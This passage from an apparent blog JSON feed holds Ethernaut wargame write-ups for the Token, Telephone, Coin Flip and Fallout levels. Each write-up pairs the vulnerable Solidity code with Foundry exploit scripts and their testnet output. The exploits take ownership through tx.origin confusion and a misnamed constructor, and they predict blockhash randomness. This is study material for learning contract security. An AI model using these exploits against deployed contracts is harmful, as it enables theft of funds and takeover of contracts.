class=\"p\">.</span><span class=\"nb\">transfer</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">),</span> <span class=\"mi\">21</span><span class=\"p\">);</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"balance: \"</span><span class=\"p\">,</span> <span class=\"n\">token_</span><span class=\"p\">.</span><span class=\"n\">balanceOf</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envAddress</span><span class=\"p\">(</span><span class=\"s\">\"MY_ADDRESS\"</span><span class=\"p\">)));</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>forge script script/TokenSol.sol <span class=\"nt\">--broadcast</span><span class=\"o\">[</span>⠊] Compiling...<span class=\"o\">[</span>⠒] Compiling 1 files with Solc 0.6.12<span class=\"o\">[</span>⠑] Solc 0.6.12 finished <span class=\"k\">in </span>497.00msCompiler run successful!Script ran successfully.<span class=\"o\">==</span> Logs <span class=\"o\">==</span>  balance:  20  balance:  115792089237316195423570985008687907853269984665640564039457584007913129639935<span class=\"c\">## Setting up 1 EVM.</span><span class=\"o\">==========================</span>Chain 17000Estimated gas price: 0.001000007 gweiEstimated total gas used <span class=\"k\">for </span>script: 67542Estimated amount required: 0.000000067542472794 ETH<span class=\"o\">==========================</span><span class=\"c\">##### holesky</span>✅  <span class=\"o\">[</span>Success] Hash: 0x6b9a4361bf15dc0a907240c72dd64d9c5cfbffafd2bbfd0197ad7dd053aa115eBlock: 3677316Paid: 0.0000000489 ETH <span class=\"o\">(</span>48900 gas <span class=\"k\">*</span> 0.001 gwei<span class=\"o\">)</span>✅ Sequence <span class=\"c\">#1 on holesky | Total Paid: 0.0000000489 ETH (48900 gas * avg 0.001 gwei)</span><span class=\"o\">==========================</span>ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.</code></pre></div></div><p><img src=\"https://0o3q.github.io/images/2025-04-18-Token/balanceofplayer.png\" alt=\"Image balanceofplayer\" /></p><p><img src=\"https://0o3q.github.io/images/2025-04-18-Token/complete.png\" alt=\"Image complete\" /></p>",
            "url": "https://0o3q.github.io/2025/04/18/token",
            
            
            
            "tags": ["blockchain","ethernaut","foundry","overflow"],
            
            "date_published": "2025-04-18T00:00:00+09:00",
            "date_modified": "2025-04-18T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2025/04/18/telephone",
            "title": "[Ethernaut] 04.Telephone",
            "summary": null,
            "content_text": "AnalysisThe goal is  Claim ownership// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Telephone {    address public owner;    constructor() {        owner = msg.sender;    }    function changeOwner(address _owner) public {        if (tx.origin != msg.sender) {            owner = _owner;        }    }}When initially creating a contract, the owner is set to msg.sender. However, in the changeOwner() function, if tx.origin and msg.sender are different, the value received as an argument is set as the owner.tx.origin is the address that first initiated the contract call (it’s always an EOA account),msg.sender is the address that last called the contract.If I call contract A, and contract A calls contract B, a difference will arise between tx.origin and msg.sender within contract B.Exploit// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import \"../src/Telephone.sol\";import \"forge-std/Script.sol\";import \"forge-std/console.sol\";contract Ex {    constructor(Telephone telephone_, address _address) {        telephone_.changeOwner(_address);    }}contract TelephoneSol is Script {    Telephone public telephone_ = Telephone(0x2823D4881bbE52bBaCc385753eDf4Fb5f15167fe);    function run() external {        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));        console.log(\"owner: \", telephone_.owner());        new Ex(telephone_, vm.envAddress(\"MY_ADDRESS\"));        console.log(\"owner: \", telephone_.owner());        vm.stopBroadcast();    }}$ forge script script/TelephoneSol.sol --broadcast --tc TelephoneSol[⠊] Compiling...[⠰] Compiling 1 files with Solc 0.8.29[⠔] Solc 0.8.29 finished in 283.34msCompiler run successful!Script ran successfully.== Logs ==  owner:  0x983B67F395c62AeE070B9c34033Bc8836E0713Eb  owner:  0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514## Setting up 1 EVM.==========================Chain 17000Estimated gas price: 0.001913718 gweiEstimated total gas used for script: 107575Estimated amount required: 0.00000020586821385 ETH==========================⠁ Sequence #1 on holesky | Waiting for pending transactions    ⠠ [Pending] 0xeb3d1ed29a0f8fbf261705f6b3f6d721b8a1f3e312a5d41ed3d4194ae44f274d    ⠲ [00:00:08] [#####################################################################] 1/1 txes (0.0s)##### holesky✅  [Success] Hash: 0xeb3d1ed29a0f8fbf261705f6b3f6d721b8a1f3e312a5d41ed3d4194ae44f274dContract Address: 0x596F07f432EB60a01F9ff7007060F4982b7C01fCBlock: 3672184Paid: 0.000000158359337 ETH (82750 gas * 0.001913708 gwei)✅ Sequence #1 on holesky | Total Paid: 0.000000158359337 ETH (82750 gas * avg 0.001913708 gwei)==========================ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goal is</p><ol>  <li>Claim ownership</li></ol><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Telephone</span> <span class=\"p\">{</span>    <span class=\"kt\">address</span> <span class=\"k\">public</span> <span class=\"n\">owner</span><span class=\"p\">;</span>    <span class=\"k\">constructor</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"n\">owner</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">changeOwner</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">_owner</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">tx</span><span class=\"p\">.</span><span class=\"n\">origin</span> <span class=\"o\">!=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">)</span> <span class=\"p\">{</span>            <span class=\"n\">owner</span> <span class=\"o\">=</span> <span class=\"n\">_owner</span><span class=\"p\">;</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>When initially creating a contract, the <code class=\"language-plaintext highlighter-rouge\">owner</code> is set to <code class=\"language-plaintext highlighter-rouge\">msg.sender</code>. However, in the <code class=\"language-plaintext highlighter-rouge\">changeOwner()</code> function, if <code class=\"language-plaintext highlighter-rouge\">tx.origin</code> and <code class=\"language-plaintext highlighter-rouge\">msg.sender</code> are different, <strong>the value received as an argument</strong> is set as the <code class=\"language-plaintext highlighter-rouge\">owner</code>.</p><p><code class=\"language-plaintext highlighter-rouge\">tx.origin</code> is the address that first initiated the contract call (it’s always an EOA account),</p><p><code class=\"language-plaintext highlighter-rouge\">msg.sender</code> is the address that last called the contract.</p><p>If I call contract A, and contract A calls contract B, a difference will arise between <code class=\"language-plaintext highlighter-rouge\">tx.origin</code> and <code class=\"language-plaintext highlighter-rouge\">msg.sender</code> within contract B.</p><h1 id=\"exploit\">Exploit</h1><hr /><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/Telephone.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/console.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Ex</span> <span class=\"p\">{</span>    <span class=\"k\">constructor</span><span class=\"p\">(</span><span class=\"n\">Telephone</span> <span class=\"n\">telephone_</span><span class=\"p\">,</span> <span class=\"kt\">address</span> <span class=\"n\">_address</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"n\">telephone_</span><span class=\"p\">.</span><span class=\"n\">changeOwner</span><span class=\"p\">(</span><span class=\"n\">_address</span><span class=\"p\">);</span>    <span class=\"p\">}</span><span class=\"p\">}</span><span class=\"k\">contract</span> <span class=\"n\">TelephoneSol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"n\">Telephone</span> <span class=\"k\">public</span> <span class=\"n\">telephone_</span> <span class=\"o\">=</span> <span class=\"n\">Telephone</span><span class=\"p\">(</span><span class=\"mh\">0x2823D4881bbE52bBaCc385753eDf4Fb5f15167fe</span><span class=\"p\">);</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envUint</span><span class=\"p\">(</span><span class=\"s\">\"PRIVATE_KEY\"</span><span class=\"p\">));</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"owner: \"</span><span class=\"p\">,</span> <span class=\"n\">telephone_</span><span class=\"p\">.</span><span class=\"n\">owner</span><span class=\"p\">());</span>        <span class=\"k\">new</span> <span class=\"n\">Ex</span><span class=\"p\">(</span><span class=\"n\">telephone_</span><span class=\"p\">,</span> <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envAddress</span><span class=\"p\">(</span><span class=\"s\">\"MY_ADDRESS\"</span><span class=\"p\">));</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"owner: \"</span><span class=\"p\">,</span> <span class=\"n\">telephone_</span><span class=\"p\">.</span><span class=\"n\">owner</span><span class=\"p\">());</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>forge script script/TelephoneSol.sol <span class=\"nt\">--broadcast</span> <span class=\"nt\">--tc</span> TelephoneSol<span class=\"o\">[</span>⠊] Compiling...<span class=\"o\">[</span>⠰] Compiling 1 files with Solc 0.8.29<span class=\"o\">[</span>⠔] Solc 0.8.29 finished <span class=\"k\">in </span>283.34msCompiler run successful!Script ran successfully.<span class=\"o\">==</span> Logs <span class=\"o\">==</span>  owner:  0x983B67F395c62AeE070B9c34033Bc8836E0713Eb  owner:  0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514<span class=\"c\">## Setting up 1 EVM.</span><span class=\"o\">==========================</span>Chain 17000Estimated gas price: 0.001913718 gweiEstimated total gas used <span class=\"k\">for </span>script: 107575Estimated amount required: 0.00000020586821385 ETH<span class=\"o\">==========================</span>⠁ Sequence <span class=\"c\">#1 on holesky | Waiting for pending transactions</span>    ⠠ <span class=\"o\">[</span>Pending] 0xeb3d1ed29a0f8fbf261705f6b3f6d721b8a1f3e312a5d41ed3d4194ae44f274d    ⠲ <span class=\"o\">[</span>00:00:08] <span class=\"o\">[</span><span class=\"c\">#####################################################################] 1/1 txes (0.0s)</span><span class=\"c\">##### holesky</span>✅  <span class=\"o\">[</span>Success] Hash: 0xeb3d1ed29a0f8fbf261705f6b3f6d721b8a1f3e312a5d41ed3d4194ae44f274dContract Address: 0x596F07f432EB60a01F9ff7007060F4982b7C01fCBlock: 3672184Paid: 0.000000158359337 ETH <span class=\"o\">(</span>82750 gas <span class=\"k\">*</span> 0.001913708 gwei<span class=\"o\">)</span>✅ Sequence <span class=\"c\">#1 on holesky | Total Paid: 0.000000158359337 ETH (82750 gas * avg 0.001913708 gwei)</span><span class=\"o\">==========================</span>ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.</code></pre></div></div><p><img src=\"https://0o3q.github.io/images/2025-04-18-Telephone/complete.png\" alt=\"Image complete\" /></p><p><img src=\"https://0o3q.github.io/images/2025-04-18-Telephone/owner().png\" alt=\"Image owner\" /></p>",
            "url": "https://0o3q.github.io/2025/04/18/telephone",
            
            
            
            "tags": ["blockchain","ethernaut","foundry","tx.origin"],
            
            "date_published": "2025-04-18T00:00:00+09:00",
            "date_modified": "2025-04-18T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2025/04/18/coin-flip",
            "title": "[Ethernaut] 03.Coin Flip",
            "summary": null,
            "content_text": "AnalysisThe goal is  guess the correct outcome 10 times in a row.// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract CoinFlip {    uint256 public consecutiveWins;    uint256 lastHash;    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;    constructor() {        consecutiveWins = 0;    }    function flip(bool _guess) public returns (bool) {        uint256 blockValue = uint256(blockhash(block.number - 1));        if (lastHash == blockValue) {            revert();        }        lastHash = blockValue;        uint256 coinFlip = blockValue / FACTOR;        bool side = coinFlip == 1 ? true : false;        if (side == _guess) {            consecutiveWins++;            return true;        } else {            consecutiveWins = 0;            return false;        }    }}Using to blackhash value to generate random numbers.Since this is accessible not only to the contract but also to external users, it becomes predictable.Exploit// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import \"../src/CoinFlip.sol\";import \"forge-std/Script.sol\";import \"forge-std/console.sol\";contract Ex {    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;    constructor(CoinFlip coinflip_) {        uint256 blockValue = uint256(blockhash(block.number - 1));        uint256 coinFlip = blockValue / FACTOR;        bool side = coinFlip == 1 ? true : false;        coinflip_.flip(side);    }}contract CoinFlipSol is Script {    CoinFlip public coinflip_ = CoinFlip(0x97Cf73B713944bD171aEd799FEDdED4BC5Fd3765);    function run() external {        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));        new Ex(coinflip_);        console.log(\"Win counts: \", coinflip_.consecutiveWins());                vm.stopBroadcast();    }}Looking at the problem code,if (lastHash == blockValue) {    revert();}Since it reverts when lastHash and blockValue are the same, it’s impossible to execute repeatedly with a loop within the same contract.Therefore, I wrote it to be executed 10 times manually to solve the problem.$ forge script script/CoinFlipSol.sol --tc CoinFlipSol --broadcast[⠊] Compiling...No files changed, compilation skippedScript ran successfully.== Logs ==  Win counts:  10## Setting up 1 EVM.==========================Chain 17000Estimated gas price: 0.002187102 gweiEstimated total gas used for script: 123189Estimated amount required: 0.000000269426908278 ETH==========================##### holesky✅  [Success] Hash: 0x0a5c9241d43f66408948fff9f14bad881a6f1717557f05d693967085b33fc4c9Contract Address: 0x0BBe439AF9BC57d2358965e1d78B2831290038F9Block: 3672028Paid: 0.000000207251214534 ETH (94761 gas * 0.002187094 gwei)✅ Sequence #1 on holesky | Total Paid: 0.000000207251214534 ETH (94761 gas * avg 0.002187094 gwei)==========================ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goal is</p><ol>  <li>guess the correct outcome 10 times in a row.</li></ol><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">CoinFlip</span> <span class=\"p\">{</span>    <span class=\"kt\">uint256</span> <span class=\"k\">public</span> <span class=\"n\">consecutiveWins</span><span class=\"p\">;</span>    <span class=\"kt\">uint256</span> <span class=\"n\">lastHash</span><span class=\"p\">;</span>    <span class=\"kt\">uint256</span> <span class=\"n\">FACTOR</span> <span class=\"o\">=</span> <span class=\"mi\">57896044618658097711785492504343953926634992332820282019728792003956564819968</span><span class=\"p\">;</span>    <span class=\"k\">constructor</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"n\">consecutiveWins</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">flip</span><span class=\"p\">(</span><span class=\"kt\">bool</span> <span class=\"n\">_guess</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">bool</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"kt\">uint256</span> <span class=\"n\">blockValue</span> <span class=\"o\">=</span> <span class=\"kt\">uint256</span><span class=\"p\">(</span><span class=\"nb\">blockhash</span><span class=\"p\">(</span><span class=\"n\">block</span><span class=\"p\">.</span><span class=\"n\">number</span> <span class=\"o\">-</span> <span class=\"mi\">1</span><span class=\"p\">));</span>        <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">lastHash</span> <span class=\"o\">==</span> <span class=\"n\">blockValue</span><span class=\"p\">)</span> <span class=\"p\">{</span>            <span class=\"nb\">revert</span><span class=\"p\">();</span>        <span class=\"p\">}</span>        <span class=\"n\">lastHash</span> <span class=\"o\">=</span> <span class=\"n\">blockValue</span><span class=\"p\">;</span>        <span class=\"kt\">uint256</span> <span class=\"n\">coinFlip</span> <span class=\"o\">=</span> <span class=\"n\">blockValue</span> <span class=\"o\">/</span> <span class=\"n\">FACTOR</span><span class=\"p\">;</span>        <span class=\"kt\">bool</span> <span class=\"n\">side</span> <span class=\"o\">=</span> <span class=\"n\">coinFlip</span> <span class=\"o\">==</span> <span class=\"mi\">1</span> <span class=\"o\">?</span> <span class=\"nb\">true</span> <span class=\"o\">:</span> <span class=\"nb\">false</span><span class=\"p\">;</span>        <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">side</span> <span class=\"o\">==</span> <span class=\"n\">_guess</span><span class=\"p\">)</span> <span class=\"p\">{</span>            <span class=\"n\">consecutiveWins</span><span class=\"o\">++</span><span class=\"p\">;</span>            <span class=\"k\">return</span> <span class=\"nb\">true</span><span class=\"p\">;</span>        <span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"p\">{</span>            <span class=\"n\">consecutiveWins</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span>            <span class=\"k\">return</span> <span class=\"nb\">false</span><span class=\"p\">;</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>Using to <code class=\"language-plaintext highlighter-rouge\">blackhash</code> value to generate random numbers.</p><p>Since this is accessible not only to the contract but also to external users, it becomes predictable.</p><h1 id=\"exploit\">Exploit</h1><hr /><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/CoinFlip.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/console.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Ex</span> <span class=\"p\">{</span>    <span class=\"kt\">uint256</span> <span class=\"k\">constant</span> <span class=\"n\">FACTOR</span> <span class=\"o\">=</span> <span class=\"mi\">57896044618658097711785492504343953926634992332820282019728792003956564819968</span><span class=\"p\">;</span>    <span class=\"k\">constructor</span><span class=\"p\">(</span><span class=\"n\">CoinFlip</span> <span class=\"n\">coinflip_</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"kt\">uint256</span> <span class=\"n\">blockValue</span> <span class=\"o\">=</span> <span class=\"kt\">uint256</span><span class=\"p\">(</span><span class=\"nb\">blockhash</span><span class=\"p\">(</span><span class=\"n\">block</span><span class=\"p\">.</span><span class=\"n\">number</span> <span class=\"o\">-</span> <span class=\"mi\">1</span><span class=\"p\">));</span>        <span class=\"kt\">uint256</span> <span class=\"n\">coinFlip</span> <span class=\"o\">=</span> <span class=\"n\">blockValue</span> <span class=\"o\">/</span> <span class=\"n\">FACTOR</span><span class=\"p\">;</span>        <span class=\"kt\">bool</span> <span class=\"n\">side</span> <span class=\"o\">=</span> <span class=\"n\">coinFlip</span> <span class=\"o\">==</span> <span class=\"mi\">1</span> <span class=\"o\">?</span> <span class=\"nb\">true</span> <span class=\"o\">:</span> <span class=\"nb\">false</span><span class=\"p\">;</span>        <span class=\"n\">coinflip_</span><span class=\"p\">.</span><span class=\"n\">flip</span><span class=\"p\">(</span><span class=\"n\">side</span><span class=\"p\">);</span>    <span class=\"p\">}</span><span class=\"p\">}</span><span class=\"k\">contract</span> <span class=\"n\">CoinFlipSol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"n\">CoinFlip</span> <span class=\"k\">public</span> <span class=\"n\">coinflip_</span> <span class=\"o\">=</span> <span class=\"n\">CoinFlip</span><span class=\"p\">(</span><span class=\"mh\">0x97Cf73B713944bD171aEd799FEDdED4BC5Fd3765</span><span class=\"p\">);</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envUint</span><span class=\"p\">(</span><span class=\"s\">\"PRIVATE_KEY\"</span><span class=\"p\">));</span>        <span class=\"k\">new</span> <span class=\"n\">Ex</span><span class=\"p\">(</span><span class=\"n\">coinflip_</span><span class=\"p\">);</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Win counts: \"</span><span class=\"p\">,</span> <span class=\"n\">coinflip_</span><span class=\"p\">.</span><span class=\"n\">consecutiveWins</span><span class=\"p\">());</span>                <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>Looking at the problem code,</p><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">lastHash</span> <span class=\"o\">==</span> <span class=\"n\">blockValue</span><span class=\"p\">)</span> <span class=\"p\">{</span>    <span class=\"nb\">revert</span><span class=\"p\">();</span><span class=\"p\">}</span></code></pre></div></div><p>Since it reverts when <code class=\"language-plaintext highlighter-rouge\">lastHash</code> and <code class=\"language-plaintext highlighter-rouge\">blockValue</code> are the same, it’s impossible to execute repeatedly with a loop within the same contract.Therefore, I wrote it to be executed 10 times manually to solve the problem.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>forge script script/CoinFlipSol.sol <span class=\"nt\">--tc</span> CoinFlipSol <span class=\"nt\">--broadcast</span><span class=\"o\">[</span>⠊] Compiling...No files changed, compilation skippedScript ran successfully.<span class=\"o\">==</span> Logs <span class=\"o\">==</span>  Win counts:  10<span class=\"c\">## Setting up 1 EVM.</span><span class=\"o\">==========================</span>Chain 17000Estimated gas price: 0.002187102 gweiEstimated total gas used <span class=\"k\">for </span>script: 123189Estimated amount required: 0.000000269426908278 ETH<span class=\"o\">==========================</span><span class=\"c\">##### holesky</span>✅  <span class=\"o\">[</span>Success] Hash: 0x0a5c9241d43f66408948fff9f14bad881a6f1717557f05d693967085b33fc4c9Contract Address: 0x0BBe439AF9BC57d2358965e1d78B2831290038F9Block: 3672028Paid: 0.000000207251214534 ETH <span class=\"o\">(</span>94761 gas <span class=\"k\">*</span> 0.002187094 gwei<span class=\"o\">)</span>✅ Sequence <span class=\"c\">#1 on holesky | Total Paid: 0.000000207251214534 ETH (94761 gas * avg 0.002187094 gwei)</span><span class=\"o\">==========================</span>ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.</code></pre></div></div><p><img src=\"https://0o3q.github.io/images/2025-04-18-Coin_Flip/complete.png\" alt=\"Image complete\" /></p><p><img src=\"https://0o3q.github.io/images/2025-04-18-Coin_Flip/win.png\" alt=\"Image win\" /></p>",
            "url": "https://0o3q.github.io/2025/04/18/coin-flip",
            
            
            
            "tags": ["blockchain","ethernaut","foundry"],
            
            "date_published": "2025-04-18T00:00:00+09:00",
            "date_modified": "2025-04-18T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2025/04/17/fallout",
            "title": "[Ethernaut] 02.Fallout",
            "summary": null,
            "content_text": "AnalysisThe goal is  Claim ownership of the contract below// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import \"openzeppelin-contracts-06/math/SafeMath.sol\";contract Fallout {    using SafeMath for uint256;    mapping(address =&gt; uint256) allocations;    address payable public owner;    /* constructor */    function Fal1out() public payable {        owner = msg.sender;        allocations[owner] = msg.value;    }    modifier onlyOwner() {        require(msg.sender == owner, \"caller is not the owner\");        _;    }    function allocate() public payable {        allocations[msg.sender] = allocations[msg.sender].add(msg.value);    }    function sendAllocation(address payable allocator) public {        require(allocations[allocator] &gt; 0);        allocator.transfer(allocations[allocator]);    }    function collectAllocations() public onlyOwner {        msg.sender.transfer(address(this).balance);    }    function allocatorBalance(address allocator) public view returns (uint256) {        return allocations[allocator];    }}Solidity 0.6.0 Documentation - constructors  💡 Prior to version 0.4.22, constructors were defined as functions with the same name as the contract. This syntax was deprecated and is not allowed anymore in version 0.5.0.For some reason, the intended constructor code was written as Fal1out(), preventing it from acting as a constructor and allowing external access, which enables claiming owner.Exploit// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import \"../src/Fallout.sol\";import \"forge-std/Script.sol\";import \"forge-std/console.sol\";contract FallbackSol is Script {    Fallout public fallout_ = Fallout(0x28eA66cBFb2900Bea8bb84f058d740ce0Ab751CB);    function run() external {        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));        fallout_.Fal1out();        console.log(\"Contract owner: \", fallout_.owner());        vm.stopBroadcast();    }}$ forge script script/FalloutSol.sol --broadcast[⠊] Compiling...No files changed, compilation skippedScript ran successfully.== Logs ==  Contract owner:  0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514## Setting up 1 EVM.==========================Chain 17000Estimated gas price: 0.002095526 gweiEstimated total gas used for script: 62992Estimated amount required: 0.000000132001373792 ETH==========================##### holesky✅  [Success] Hash: 0xcaa845bc5fa9ebb3adcb5902c12ffa24c14a609adc31cd0b789bfae23b11c5aaBlock: 3669787Paid: 0.000000095568239514 ETH (45606 gas * 0.002095519 gwei)✅ Sequence #1 on holesky | Total Paid: 0.000000095568239514 ETH (45606 gas * avg 0.002095519 gwei)==========================ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goal is</p><ol>  <li>Claim ownership of the contract below</li></ol><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.6</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"openzeppelin-contracts-06/math/SafeMath.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Fallout</span> <span class=\"p\">{</span>    <span class=\"k\">using</span> <span class=\"n\">SafeMath</span> <span class=\"k\">for</span> <span class=\"kt\">uint256</span><span class=\"p\">;</span>    <span class=\"k\">mapping</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"o\">=&gt;</span> <span class=\"kt\">uint256</span><span class=\"p\">)</span> <span class=\"n\">allocations</span><span class=\"p\">;</span>    <span class=\"kt\">address</span> <span class=\"k\">payable</span> <span class=\"k\">public</span> <span class=\"n\">owner</span><span class=\"p\">;</span>    <span class=\"cm\">/* constructor */</span>    <span class=\"k\">function</span> <span class=\"n\">Fal1out</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"k\">payable</span> <span class=\"p\">{</span>        <span class=\"n\">owner</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">;</span>        <span class=\"n\">allocations</span><span class=\"p\">[</span><span class=\"n\">owner</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">value</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">modifier</span> 